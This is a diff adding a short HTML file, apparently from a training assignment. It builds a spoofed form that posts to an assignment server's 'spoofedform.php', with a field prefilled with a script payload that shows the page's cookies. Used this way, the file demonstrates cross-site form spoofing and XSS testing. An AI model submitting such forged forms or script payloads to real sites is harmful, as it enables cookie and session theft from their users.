@@ -1,0 +1,8 @@
+<html>    
+    <form action="http://assignment.webonise.com/spike2/spoofedform.php" method="POST">
+<input type="text" name="name" value="<script>alert(document.cookie)</script>"/><br>
+
+	    <input type="submit" />
+    </form>
+</html>
+
